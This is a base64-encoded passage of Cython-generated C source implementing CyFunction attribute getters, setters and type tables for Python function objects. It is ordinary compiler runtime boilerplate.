JFRihQeV9Ob25lKTtcbiAgICByZXR1cm4gUHlfTm9uZTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9jb2RlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KVxue1xuICAgIFB5T2JqZWN0KiByZXN1bHQgPSAob3AtPmZ1bmNfY29kZSkgPyBvcC0+ZnVuY19jb2RlIDogUHlfTm9uZTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBQeV9JTkNSRUYocmVzdWx0KTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9pbml0X2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7XG4gICAgaW50IHJlc3VsdCA9IDA7XG4gICAgUHlPYmplY3QgKnJlcyA9IG9wLT5kZWZhdWx0c19nZXR0ZXIoKFB5T2JqZWN0ICopIG9wKTtcbiAgICBpZiAodW5saWtlbHkoIXJlcykpXG4gICAgICAgIHJldHVybiAtMTtcbiAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBQeVR1cGxlX0dFVF9JVEVNKHJlcywgMCk7XG4gICAgUHlfSU5DUkVGKG9wLT5kZWZhdWx0c190dXBsZSk7XG4gICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IFB5VHVwbGVfR0VUX0lURU0ocmVzLCAxKTtcbiAgICBQeV9JTkNSRUYob3AtPmRlZmF1bHRzX2t3ZGljdCk7XG4gICAgI2Vsc2VcbiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0ocmVzLCAwKTtcbiAgICBpZiAodW5saWtlbHkoIW9wLT5kZWZhdWx0c190dXBsZSkpIHJlc3VsdCA9IC0xO1xuICAgIGVsc2Uge1xuICAgICAgICBvcC0+ZGVmYXVsdHNfa3dkaWN0ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHJlcywgMSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghb3AtPmRlZmF1bHRzX2t3ZGljdCkpIHJlc3VsdCA9IC0xO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICBQeV9ERUNSRUYocmVzKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICghdmFsdWUpIHtcbiAgICAgICAgdmFsdWUgPSBQeV9Ob25lO1xuICAgIH0gZWxzZSBpZiAodW5saWtlbHkodmFsdWUgIT0gUHlfTm9uZSAmJiAhUHlUdXBsZV9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19kZWZhdWx0c19fIG11c3QgYmUgc2V0IHRvIGEgdHVwbGUgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlFcnJfV2FybkV4KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAiY2hhbmdlcyB0byBjeWZ1bmN0aW9uLl9fZGVmYXVsdHNfXyB3aWxsIG5vdCAiXG4gICAgICAgICAgICAgICAgICJjdXJyZW50bHkgYWZmZWN0IHRoZSB2YWx1ZXMgdXNlZCBpbiBmdW5jdGlvbiBjYWxscyIsIDEpO1xuICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmRlZmF1bHRzX3R1cGxlLCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9kZWZhdWx0c19sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApIHtcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gb3AtPmRlZmF1bHRzX3R1cGxlO1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkge1xuICAgICAgICBpZiAob3AtPmRlZmF1bHRzX2dldHRlcikge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X0N5RnVuY3Rpb25faW5pdF9kZWZhdWx0cyhvcCkgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICByZXN1bHQgPSBvcC0+ZGVmYXVsdHNfdHVwbGU7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXN1bHQgPSBQeV9Ob25lO1xuICAgICAgICB9XG4gICAgfVxuICAgIFB5X0lOQ1JFRihyZXN1bHQpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9kZWZhdWx0c19sb2NrZWQob3ApO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fc2V0X2t3ZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICghdmFsdWUpIHtcbiAgICAgICAgdmFsdWUgPSBQeV9Ob25lO1xuICAgIH0gZWxzZSBpZiAodW5saWtlbHkodmFsdWUgIT0gUHlfTm9uZSAmJiAhUHlEaWN0X0NoZWNrKHZhbHVlKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJfX2t3ZGVmYXVsdHNfXyBtdXN0IGJlIHNldCB0byBhIGRpY3Qgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlFcnJfV2FybkV4KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAiY2hhbmdlcyB0byBjeWZ1bmN0aW9uLl9fa3dkZWZhdWx0c19fIHdpbGwgbm90ICJcbiAgICAgICAgICAgICAgICAgImN1cnJlbnRseSBhZmZlY3QgdGhlIHZhbHVlcyB1c2VkIGluIGZ1bmN0aW9uIGNhbGxzIiwgMSk7XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZGVmYXVsdHNfa3dkaWN0LCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkge1xuICAgIFB5T2JqZWN0KiByZXN1bHQgPSBvcC0+ZGVmYXVsdHNfa3dkaWN0O1xuICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkge1xuICAgICAgICBpZiAob3AtPmRlZmF1bHRzX2dldHRlcikge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X0N5RnVuY3Rpb25faW5pdF9kZWZhdWx0cyhvcCkgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICByZXN1bHQgPSBvcC0+ZGVmYXVsdHNfa3dkaWN0O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlfTm9uZTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBQeV9JTkNSRUYocmVzdWx0KTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBQeU9iamVjdCogcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHNfbG9ja2VkKG9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9hbm5vdGF0aW9ucyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QqIHZhbHVlLCB2b2lkICpjb250ZXh0KSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKCF2YWx1ZSB8fCB2YWx1ZSA9PSBQeV9Ob25lKSB7XG4gICAgICAgIHZhbHVlID0gTlVMTDtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KCFQeURpY3RfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgIl9fYW5ub3RhdGlvbnNfXyBtdXN0IGJlIHNldCB0byBhIGRpY3Qgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfWElOQ1JFRih2YWx1ZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmZ1bmNfYW5ub3RhdGlvbnMsIHZhbHVlKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiAwO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Fubm90YXRpb25zX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkge1xuICAgIFB5T2JqZWN0KiByZXN1bHQgPSBvcC0+ZnVuY19hbm5vdGF0aW9ucztcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHtcbiAgICAgICAgcmVzdWx0ID0gUHlEaWN0X05ldygpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHJldHVybiBOVUxMO1xuICAgICAgICBvcC0+ZnVuY19hbm5vdGF0aW9ucyA9IHJlc3VsdDtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHJlc3VsdCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9hbm5vdGF0aW9ucyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnNfbG9ja2VkKG9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lX3ZhbHVlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7XG4gICAgaW50IGlzX2Nvcm91dGluZSA9IG9wLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ09ST1VUSU5FO1xuICAgIGlmIChpc19jb3JvdXRpbmUpIHtcbiAgICAgICAgUHlPYmplY3QgKmlzX2Nvcm91dGluZV92YWx1ZSwgKm1vZHVsZSwgKmZyb21saXN0LCAqbWFya2VyID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lzX2Nvcm91dGluZTtcbiAgICAgICAgZnJvbWxpc3QgPSBQeUxpc3RfTmV3KDEpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWZyb21saXN0KSkgcmV0dXJuIE5VTEw7XG4gICAgICAgIFB5X0lOQ1JFRihtYXJrZXIpO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgUHlMaXN0X1NFVF9JVEVNKGZyb21saXN0LCAwLCBtYXJrZXIpO1xuI2Vsc2VcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5TGlzdF9TZXRJdGVtKGZyb21saXN0LCAwLCBtYXJrZXIpIDwgMCkpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihtYXJrZXIpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGZyb21saXN0KTtcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlTGV2ZWxPYmplY3QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FzeW5jaW9fY29yb3V0aW5lcywgTlVMTCwgTlVMTCwgZnJvbWxpc3QsIDApO1xuICAgICAgICBQeV9ERUNSRUYoZnJvbWxpc3QpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIGdvdG8gaWdub3JlO1xuICAgICAgICBpc19jb3JvdXRpbmVfdmFsdWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG1vZHVsZSwgbWFya2VyKTtcbiAgICAgICAgUHlfREVDUkVGKG1vZHVsZSk7XG4gICAgICAgIGlmIChsaWtlbHkoaXNfY29yb3V0aW5lX3ZhbHVlKSkge1xuICAgICAgICAgICAgcmV0dXJuIGlzX2Nvcm91dGluZV92YWx1ZTtcbiAgICAgICAgfVxuaWdub3JlOlxuICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfUHlCb29sX0Zyb21Mb25nKGlzX2Nvcm91dGluZSk7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAob3AtPmZ1bmNfaXNfY29yb3V0aW5lKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYob3AtPmZ1bmNfaXNfY29yb3V0aW5lKTtcbiAgICB9XG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lX3ZhbHVlKG9wKTtcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIGlmIChvcC0+ZnVuY19pc19jb3JvdXRpbmUpIHtcbiAgICAgICAgUHlfREVDUkVGKHJlc3VsdCk7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X05ld1JlZihvcC0+ZnVuY19pc19jb3JvdXRpbmUpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIG9wLT5mdW5jX2lzX2Nvcm91dGluZSA9IF9fUHl4X05ld1JlZihyZXN1bHQpO1xuICAgIH1cbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmZ1bmMsIGNvbnN0IGNoYXIqIG1lc3NhZ2UsIFB5X3NzaXplX3Qgc2l6ZSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeU9iamVjdCAqcHlfbmFtZSA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoZnVuYywgTlVMTCk7XG4gICAgaWYgKCFweV9uYW1lKSByZXR1cm47XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiUuMjAwUygpICVzICglIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgZ2l2ZW4pIixcbiAgICAgICAgcHlfbmFtZSwgbWVzc2FnZSwgc2l6ZSk7XG4gICAgUHlfREVDUkVGKHB5X25hbWUpO1xuI2Vsc2VcbiAgICBjb25zdCBjaGFyKiBuYW1lID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fbWwtPm1sX25hbWU7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiUuMjAwcygpICVzICglIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgZ2l2ZW4pIixcbiAgICAgICAgbmFtZSwgbWVzc2FnZSwgc2l6ZSk7XG4jZW5kaWZcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpmdW5jLCBjb25zdCBjaGFyKiBtZXNzYWdlKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5T2JqZWN0ICpweV9uYW1lID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZShmdW5jLCBOVUxMKTtcbiAgICBpZiAoIXB5X25hbWUpIHJldHVybjtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAiJS4yMDBTKCkgJXMiLFxuICAgICAgICBweV9uYW1lLCBtZXNzYWdlKTtcbiAgICBQeV9ERUNSRUYocHlfbmFtZSk7XG4jZWxzZVxuICAgIGNvbnN0IGNoYXIqIG5hbWUgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9tbC0+bWxfbmFtZTtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAiJS4yMDBzKCkgJXMiLFxuICAgICAgICBuYW1lLCBtZXNzYWdlKTtcbiNlbmRpZlxufVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9tb2R1bGUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICByZXR1cm4gUHlPYmplY3RfR2V0QXR0clN0cmluZyhvcC0+ZnVuYywgIl9fbW9kdWxlX18iKTtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fc2V0X21vZHVsZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QqIHZhbHVlLCB2b2lkICpjb250ZXh0KSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgcmV0dXJuIFB5T2JqZWN0X1NldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX21vZHVsZV9fIiwgdmFsdWUpO1xufVxuI2VuZGlmXG5zdGF0aWMgUHlHZXRTZXREZWYgX19weXhfQ3lGdW5jdGlvbl9nZXRzZXRzW10gPSB7XG4gICAgeyJmdW5jX2RvYyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RvYywgMCwgMH0sXG4gICAgeyJfX2RvY19fIiwgIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RvYywgMCwgMH0sXG4gICAgeyJmdW5jX25hbWUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZSwgMCwgMH0sXG4gICAgeyJfX25hbWVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZSwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9uYW1lLCAwLCAwfSxcbiAgICB7Il9fcXVhbG5hbWVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfcXVhbG5hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfcXVhbG5hbWUsIDAsIDB9LFxuICAgIHsiZnVuY19kaWN0IiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0LCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RpY3QsIDAsIDB9LFxuICAgIHsiX19kaWN0X18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RpY3QsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGljdCwgMCwgMH0sXG4gICAgeyJmdW5jX2dsb2JhbHMiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2dsb2JhbHMsIDAsIDAsIDB9LFxuICAgIHsiX19nbG9iYWxzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2dsb2JhbHMsIDAsIDAsIDB9LFxuICAgIHsiZnVuY19jbG9zdXJlIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9jbG9zdXJlLCAwLCAwLCAwfSxcbiAgICB7Il9fY2xvc3VyZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9jbG9zdXJlLCAwLCAwLCAwfSxcbiAgICB7ImZ1bmNfY29kZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY29kZSwgMCwgMCwgMH0sXG4gICAgeyJfX2NvZGVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY29kZSwgMCwgMCwgMH0sXG4gICAgeyJmdW5jX2RlZmF1bHRzIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kZWZhdWx0cywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kZWZhdWx0cywgMCwgMH0sXG4gICAgeyJfX2RlZmF1bHRzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RlZmF1bHRzLCAwLCAwfSxcbiAgICB7Il9fa3dkZWZhdWx0c19fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2t3ZGVmYXVsdHMsIDAsIDB9LFxuICAgIHsiX19hbm5vdGF0aW9uc19fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9hbm5vdGF0aW9ucywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9hbm5vdGF0aW9ucywgMCwgMH0sXG4gICAgeyJfaXNfY29yb3V0aW5lIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9pc19jb3JvdXRpbmUsIDAsIDAsIDB9LFxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB7Il9fbW9kdWxlX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X21vZHVsZSwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9tb2R1bGUsIDAsIDB9LFxuI2VuZGlmXG4gICAgezAsIDAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5TWVtYmVyRGVmIF9fcHl4X0N5RnVuY3Rpb25fbWVtYmVyc1tdID0ge1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgeyJfX21vZHVsZV9fIiwgVF9PQkpFQ1QsIG9mZnNldG9mKFB5Q0Z1bmN0aW9uT2JqZWN0LCBtX21vZHVsZSksIDAsIDB9LFxuI2VuZGlmXG4gICAgeyJfX2RpY3RvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QsIGZ1bmNfZGljdCksIFJFQURPTkxZLCAwfSxcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB7Il9fdmVjdG9yY2FsbG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCwgZnVuY192ZWN0b3JjYWxsKSwgUkVBRE9OTFksIDB9LFxuI2Vsc2VcbiAgICB7Il9fdmVjdG9yY2FsbG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoUHlDRnVuY3Rpb25PYmplY3QsIHZlY3RvcmNhbGwpLCBSRUFET05MWSwgMH0sXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBmdW5jX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LFxuI2Vsc2VcbiAgICB7Il9fd2Vha2xpc3RvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKFB5Q0Z1bmN0aW9uT2JqZWN0LCBtX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LFxuI2VuZGlmXG4jZW5kaWZcbiAgICB7MCwgMCwgMCwgIDAsIDB9XG59O1xuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fcmVkdWNlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0sIFB5T2JqZWN0ICphcmdzKVxue1xuICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBOVUxMO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGFyZ3MpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04obSk7XG4gICAgUHlfSU5DUkVGKG0tPmZ1bmNfcXVhbG5hbWUpO1xuICAgIHJlc3VsdCA9IG0tPmZ1bmNfcXVhbG5hbWU7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X0N5RnVuY3Rpb25fbWV0aG9kc1tdID0ge1xuICAgIHsiX19yZWR1Y2VfXyIsIChQeUNGdW5jdGlvbilfX1B5eF9DeUZ1bmN0aW9uX3JlZHVjZSwgTUVUSF9WQVJBUkdTLCAwfSxcbiAgICB7MCwgMCwgMCwgMH1cbn07XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KGN5ZnVuYykgKChjeWZ1bmMpLT5mdW5jX3dlYWty